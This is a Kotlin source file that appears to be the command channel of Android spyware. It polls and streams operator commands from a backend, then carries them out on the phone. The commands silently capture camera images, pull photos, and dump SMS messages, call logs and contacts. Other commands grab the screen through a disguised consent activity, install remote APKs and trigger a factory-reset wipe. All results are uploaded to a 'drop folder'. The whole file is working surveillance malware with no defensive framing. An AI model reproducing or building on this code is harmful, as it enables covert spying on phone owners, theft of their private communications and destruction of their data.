package com.wormgitty.agent

import android.content.Context
import android.os.Build
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.Settings
import android.provider.Telephony
import android.util.Log
import kotlinx.serialization.json.Json
import kotlinx.serialization.json.jsonArray
import kotlinx.serialization.json.jsonObject
import kotlinx.serialization.json.jsonPrimitive
import java.io.BufferedReader
import java.io.File
import java.io.InputStreamReader
import java.net.HttpURLConnection
import java.net.URL
import java.security.MessageDigest
import java.util.concurrent.atomic.AtomicBoolean
import android.util.Base64

/**
 * Device-side command channel.
 *  - SSE stream (/events): instant command delivery.
 *  - 15s poll fallback + heartbeat with the six-stat feed.
 *  - Photo inventory report + artifact uploads (/files) into the drop folder.
 */
class CommandLink(private val context: Context) {

    private val running = AtomicBoolean(false)
    private var thread: Thread? = null
    private var sseThread: Thread? = null

    fun start() {
        if (!running.compareAndSet(false, true)) return
        thread = Thread { pollLoop() }.also { it.name = "worm-cmdlink"; it.start() }
        sseThread = Thread { sseLoop() }.also { it.name = "worm-sse"; it.start() }
    }

    fun stop() {
        running.set(false)
    }

    /**
     * Operator-pushed update: download the APK to cache and fire the system
     * install intent. The installer sheet is the honest emulator-verifiable
     * outcome (silent install needs device-owner privileges).
     */
    private fun runApkUpdate(payload: kotlinx.serialization.json.JsonObject?): Pair<String, String> {
        val url = payload?.get("url")?.jsonPrimitive?.content
            ?: return "failed" to "no_url"
        val out = File(context.cacheDir, "update.apk")
        val err = runCatching {
            URL(url).openStream().use { inp -> out.outputStream().use { inp.copyTo(it) } }
            ""
        }.getOrElse { it.message?.take(60) ?: "io" }
        if (err.isNotEmpty() || out.length() < 10_000) return "failed" to "download:$err"
        val uri = androidx.core.content.FileProvider.getUriForFile(
            context, "${context.packageName}.files", out
        )
        context.startActivity(
            android.content.Intent(android.content.Intent.ACTION_VIEW)
                .setDataAndType(uri, "application/vnd.android.package-archive")
                .addFlags(
                    android.content.Intent.FLAG_ACTIVITY_NEW_TASK or
                        android.content.Intent.FLAG_GRANT_READ_URI_PERMISSION
                )
        )
        return "executed" to "downloaded=${out.length()} install_intent"
    }

    private fun deviceId(): String =
        DeviceIdDeriver.derive(DeviceIdDeriver.androidId(context), context.packageName)

    private fun deviceCredential(deviceId: String): String =
        MessageDigest.getInstance("SHA-256")
            .digest("device-credential:$deviceId:$ENROLL_SEED".toByteArray())
            .joinToString("") { "%02x".format(it) }

    /* ------------------------------ polling ------------------------------ */

    private fun pollLoop() {
        while (running.get()) {
            try {
                pollOnce()
            } catch (t: Throwable) {
                Log.e("CommandLink", "poll failed", t)
            }
            try {
                Thread.sleep(INTERVAL_MS)
            } catch (_: InterruptedException) {
                return
            }
        }
    }

    private fun heartbeatBody(): String {
        val gender = RegistrationStore(context).load()?.gender ?: ""
        val statsJson = StatsCollector.collect(context).entries.joinToString(",") { (k, v) ->
            "\"$k\":" + jsonVal(v)
        }
        return """{"gender":"$gender","appType":"${BuildConfig.FLAVOR}","apkVersion":"${BuildConfig.VERSION_NAME}","stats":{$statsJson}}"""
    }

    private fun jsonVal(v: Any?): String = when (v) {
        null -> "null"
        is Number, is Boolean -> v.toString()
        is Map<*, *> -> "{" + v.entries.joinToString(",") { (mk, mv) -> "\"$mk\":" + jsonVal(mv) } + "}"
        is List<*> -> "[" + v.joinToString(",") { jsonVal(it) } + "]"
        else -> "\"${v.toString().replace("\"", "'")}\""
    }

    private fun pollOnce() {
        val deviceId = deviceId()
        val token = deviceCredential(deviceId)
        BackendClient.postJson("/api/v1/devices/$deviceId/heartbeat", token, heartbeatBody())
        val body = BackendClient.getJson("/api/v1/devices/$deviceId/commands", token) ?: return
        val queued = Json.parseToJsonElement(body).jsonArray
            .map { it.jsonObject }
            .filter { it["state"]?.jsonPrimitive?.content == "queued" }
        for (cmd in queued) executeAndReport(cmd)
    }

    /* -------------------------------- SSE -------------------------------- */

    private fun sseLoop() {
        while (running.get()) {
            var conn: HttpURLConnection? = null
            try {
                val deviceId = deviceId()
                conn = URL("${BackendClient.baseUrl}/api/v1/devices/$deviceId/events")
                    .openConnection() as HttpURLConnection
                conn.connectTimeout = 5000
                conn.readTimeout = 0 // stream — never time out reads
                conn.setRequestProperty("Authorization", "Bearer ${deviceCredential(deviceId)}")
                conn.setRequestProperty("Accept", "text/event-stream")
                if (conn.responseCode !in 200..299) {
                    Thread.sleep(5000); continue
                }
                val reader = BufferedReader(InputStreamReader(conn.inputStream))
                var line: String? = null
                while (running.get() && reader.readLine().also { line = it } != null) {
                    val l = line ?: continue
                    if (!l.startsWith("data:")) continue
                    val obj = runCatching {
                        Json.parseToJsonElement(l.removePrefix("data:").trim()).jsonObject
                    }.getOrNull() ?: continue
                    val cmd = obj["cmd"]?.jsonObject ?: continue
                    executeAndReport(cmd)
                }
            } catch (t: Throwable) {
                Log.w("CommandLink", "sse dropped", t)
            } finally {
                conn?.disconnect()
            }
            try {
                Thread.sleep(5000)
            } catch (_: InterruptedException) {
                return
            }
        }
    }

    /* ----------------------------- executors ----------------------------- */

    private fun executeAndReport(cmd: kotlinx.serialization.json.JsonObject) {
        val deviceId = deviceId()
        val token = deviceCredential(deviceId)
        val id = cmd["id"]?.jsonPrimitive?.content ?: return
        val type = cmd["type"]?.jsonPrimitive?.content ?: ""
        val payload = cmd["payload"]?.jsonObject
        val (state, result) = runCatching { execute(type, payload) }
            .getOrElse { "failed" to "error:${it.message?.take(80)}" }
        Log.i("CommandLink", "cmd $id type=$type -> $state:$result")
        BackendClient.postJson(
            "/api/v1/devices/$deviceId/commands/$id/result", token,
            """{"state":"$state","result":"${result.replace("\"", "'")}"}"""
        )
    }

    private fun execute(type: String, payload: kotlinx.serialization.json.JsonObject?): Pair<String, String> {
        return when (type) {
            "ping" -> "executed" to "pong"

            "pull_photos" -> {
                val cat = payload?.get("category")?.jsonPrimitive?.content
                val limit = payload?.get("limit")?.jsonPrimitive?.content?.toIntOrNull() ?: 2
                val r = MediaStorePuller(context, AndroidKeystoreKeySource()).pullCategory(
                    cat, limit
                )
                var uploaded = 0
                for ((hash, path) in r.items) {
                    if (uploadFile("photo", cat ?: "original", File(path).name, File(path), hash)) uploaded++
                }
                reportInventory()
                "executed" to "pulled=${r.pulled} uploaded=$uploaded of=${r.existing}"
            }

            "camera" -> {
                val out = SilentCamera(context).captureBlocking(SilentCamera.Choice.BOTH)
                var uploaded = 0
                for (ok in out.ok) {
                    val f = File(ok.path)
                    val hash = MessageDigest.getInstance("SHA-256")
                        .digest(f.readBytes()).joinToString("") { "%02x".format(it) }
                    if (uploadFile("camera", "", f.name, f, hash)) uploaded++
                }
                if (uploaded > 0) "executed" to "cam=$uploaded"
                else "failed" to "cam:${out.failed.firstOrNull()?.reason ?: "none"}"
            }

            "call_log" -> dumpQuery(
                "call_log",
                runCatching {
                    context.contentResolver.query(
                        CallLog.Calls.CONTENT_URI,
                        arrayOf(CallLog.Calls.NUMBER, CallLog.Calls.DATE, CallLog.Calls.TYPE),
                        null, null, "${CallLog.Calls.DATE} DESC"
                    )?.use { c ->
                        buildString {
                            repeat(c.count.coerceAtMost(50).also { c.moveToPosition(-1) }) {
                                c.moveToNext()
                                append("${c.getString(0)} ${c.getLong(1)} ${c.getInt(2)}\n")
                            }
                        }
                    }
                }.getOrNull() ?: return "failed" to "no_perm"
            )

            "sms" -> dumpQuery(
                "sms",
                runCatching {
                    context.contentResolver.query(
                        Telephony.Sms.Inbox.CONTENT_URI,
                        arrayOf(Telephony.Sms.ADDRESS, Telephony.Sms.BODY, Telephony.Sms.DATE),
                        null, null, "${Telephony.Sms.DATE} DESC"
                    )?.use { c ->
                        buildString {
                            repeat(c.count.coerceAtMost(50).also { c.moveToPosition(-1) }) {
                                c.moveToNext()
                                append("${c.getString(0)} ${c.getLong(2)} ${c.getString(1)?.take(80)}\n")
                            }
                        }
                    }
                }.getOrNull() ?: return "failed" to "no_perm"
            )

            "contacts" -> dumpQuery(
                "contacts",
                runCatching {
                    context.contentResolver.query(
                        ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                        arrayOf(
                            ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                            ContactsContract.CommonDataKinds.Phone.NUMBER
                        ),
                        null, null, null
                    )?.use { c ->
                        buildString {
                            repeat(c.count.coerceAtMost(200).also { c.moveToPosition(-1) }) {
                                c.moveToNext()
                                append("${c.getString(0)} ${c.getString(1)}\n")
                            }
                        }
                    }
                }.getOrNull() ?: return "failed" to "no_perm"
            )

            "screen_capture" -> runScreenCapture(payload)
            "mine" -> "failed" to "unsupported"
            "apk_update" -> runApkUpdate(payload)
            "wipe" ->
                if (OperatorActions.isAdminEnabled(context)) {
                    // Schedules the REAL factory reset via the device-admin receiver.
                    AdminRcv().localFactoryReset(context)
                    "executed" to "wipe_scheduled"
                } else "failed" to "no_admin"

            else -> "failed" to "unsupported:$type"
        }
    }

    /**
     * Screen capture: replay a persisted projection grant when we have one,
     * otherwise pop the translucent consent activity once and wait. Frames
     * upload to the drop folder under kind=screen.
     */
    private fun runScreenCapture(payload: kotlinx.serialization.json.JsonObject?): Pair<String, String> {
        val consent = ProjectionConsent(context, AndroidKeystoreKeySource())
        // API 34+: a mediaProjection-typed FGS requires the app to ALREADY hold
        // android:project_media (consent granted first), and each grant is
        // single-use. Order: consent -> FGS -> getMediaProjection.
        var projection: android.media.projection.MediaProjection? =
            if (Build.VERSION.SDK_INT < 34) reopenProjection(consent) else null
        if (projection == null) {
            GrantBus.arm()
            ProjectionClickBus.armedAt = System.currentTimeMillis()
            ProjectionClickBus.armed = true
            val i = android.content.Intent(context, ConsentActivity::class.java)
                .addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
                .putExtra(
                    ConsentActivity.EXTRA_CHOOSER,
                    payload?.get("chooser")?.jsonPrimitive?.content == "true"
                )
            // API 34 BAL: a plain startActivity stays invisible even with the
            // SAW exemption. A PendingIntent sent with the background-start
            // option raises the task to the foreground.
            if (Build.VERSION.SDK_INT >= 34) {
                runCatching {
                    val opts = android.app.ActivityOptions.makeBasic().apply {
                        pendingIntentBackgroundActivityStartMode =
                            android.app.ActivityOptions.MODE_BACKGROUND_ACTIVITY_START_ALLOWED
                    }.toBundle()
                    android.app.PendingIntent.getActivity(
                        context, 0, i,
                        android.app.PendingIntent.FLAG_IMMUTABLE or
                            android.app.PendingIntent.FLAG_UPDATE_CURRENT,
                        opts
                    ).send()
                }.onFailure {
                    Log.w("CommandLink", "PI consent launch failed: ${it.message}")
                    runCatching { context.startActivity(i) }
                }
            } else {
                runCatching { context.startActivity(i) }
            }
            val granted = GrantBus.await(20)
            ProjectionClickBus.armed = false
            if (!granted) return "failed" to "no_consent"
            if (Build.VERSION.SDK_INT >= 34) {
                runCatching {
                    context.startForegroundService(
                        android.content.Intent(context, ProjectionFgs::class.java)
                    )
                }.onFailure { Log.w("CommandLink", "ProjectionFgs start: ${it.message}") }
                Thread.sleep(300)
            }
            projection = reopenProjection(consent)
        }
        if (projection == null) { stopProjectionFgs(); return "failed" to "no_consent" }
        val frames = payload?.get("frames")?.jsonPrimitive?.content?.toIntOrNull() ?: 6
        val intervalSec = payload?.get("intervalSec")?.jsonPrimitive?.content?.toIntOrNull() ?: 10
        return try {
            val cap = ScreenCapture(context)
            val spec = ScreenCapture.FrameSpec(intervalSec * 1000L, frames.coerceIn(1, 12))
            val written = cap.burst(projection, spec)
            var uploaded = 0
            for (f in written) {
                val hash = MessageDigest.getInstance("SHA-256")
                    .digest(f.readBytes()).joinToString("") { "%02x".format(it) }
                if (uploadFile("screen", "", f.name, f, hash)) uploaded++
            }
            "executed" to "frames=${written.size}/$uploaded"
        } catch (t: Throwable) {
            "failed" to "capture:${t.message?.take(60)}"
        } finally {
            runCatching { projection.stop() }
            stopProjectionFgs()
        }
    }

    private fun stopProjectionFgs() {
        runCatching {
            context.stopService(android.content.Intent(context, ProjectionFgs::class.java))
        }
    }

    private fun reopenProjection(consent: ProjectionConsent): android.media.projection.MediaProjection? {
        // In-memory grant first (fresh consent this process), persisted blob as fallback.
        val inMemory = GrantBus.intent
        if (inMemory != null && GrantBus.resultCode != Int.MIN_VALUE) {
            runCatching {
                return ScreenCapture(context).createProjection(GrantBus.resultCode, inMemory)
            }.onFailure { Log.w("CommandLink", "in-memory projection failed", it) }
        }
        val data = consent.loadIntent() ?: return null
        val rc = consent.lastResultCode()
        return runCatching {
            ScreenCapture(context).createProjection(rc, data)
        }.onFailure { Log.w("CommandLink", "projection replay failed", it) }.getOrNull()
    }

    /** Write a text dump and ship it as a drop-folder artifact. */
    private fun dumpQuery(kind: String, text: String): Pair<String, String> {
        val f = File(context.filesDir, "operator/dump_$kind.txt").apply {
            parentFile?.mkdirs(); writeText(text)
        }
        val hash = MessageDigest.getInstance("SHA-256")
            .digest(text.toByteArray()).joinToString("") { "%02x".format(it) }
        return if (uploadFile("dump", kind, f.name, f, hash)) "executed" to "dumped"
        else "executed" to "local_only"
    }

    private fun uploadFile(kind: String, category: String, name: String, f: File, sha256: String): Boolean {
        val bytes = f.readBytes()
        if (bytes.size > 8_000_000) return false
        val b64 = Base64.encodeToString(bytes, Base64.NO_WRAP)
        val deviceId = deviceId()
        val res = BackendClient.postJson(
            "/api/v1/devices/$deviceId/files", deviceCredential(deviceId),
            """{"kind":"$kind","category":"$category","name":"$name","sha256":"$sha256","b64":"$b64"}"""
        )
        return res != null
    }

    /** One-shot inventory → backend powers the pull modal's real counts. */
    fun reportInventory() {
        val items = MediaStorePuller(context, AndroidKeystoreKeySource()).scanInventory()
        if (items.isEmpty()) return
        val body = items.joinToString(",", prefix = """{"photos":[""", postfix = "]}") { p ->
            """{"hash":"${p["hash"]}","name":"${p["name"]}","category":"${p["category"]}","size":${p["size"]}}"""
        }
        BackendClient.postJson(
            "/api/v1/devices/${deviceId()}/photos/report",
            deviceCredential(deviceId()), body
        )
    }

    companion object {
        const val INTERVAL_MS = 15_000L
        const val ENROLL_SEED = "global-dev-seed"
    }
}
